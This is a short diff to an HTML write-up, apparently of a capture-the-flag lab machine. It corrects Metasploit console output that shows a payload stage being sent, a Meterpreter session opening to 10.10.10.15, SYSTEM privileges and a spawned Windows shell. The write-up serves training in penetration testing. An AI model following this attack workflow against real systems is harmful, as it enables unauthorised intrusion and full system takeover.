@@ -269,11 +269,11 @@ categories:
 <br><font color="RoyalBlue">[*]</font> Payload injected. Executing exploit...
 <br><font color="RoyalBlue">[*]</font> Sending stage (957487 bytes) to 10.10.10.15
 <br><font color="53E100">[+]</font> Exploit finished, wait for (hopefully privileged) payload execution to complete.
-<br><font color="RoyalBlue">[*]</font> Meterpreter session 3 opened (10.10.*.*:444 -> 10.10.10.15:1031) at 2018-02-22 20:21:02 -0500</p>
+<br><font color="RoyalBlue">[*]</font> Meterpreter session 2 opened (10.10.*.*:444 -> 10.10.10.15:1031) at 2018-02-22 20:21:02 -0500</p>
 
 <p>meterpreter > getuid 
 <br>Server username: NT AUTHORITY\SYSTEM
-<br>meterpreter > shell\r
+<br>meterpreter > shell
 <br>Process 1660 created.
 <br>Channel 1 created.
 <br>Microsoft Windows [Version 5.2.3790]
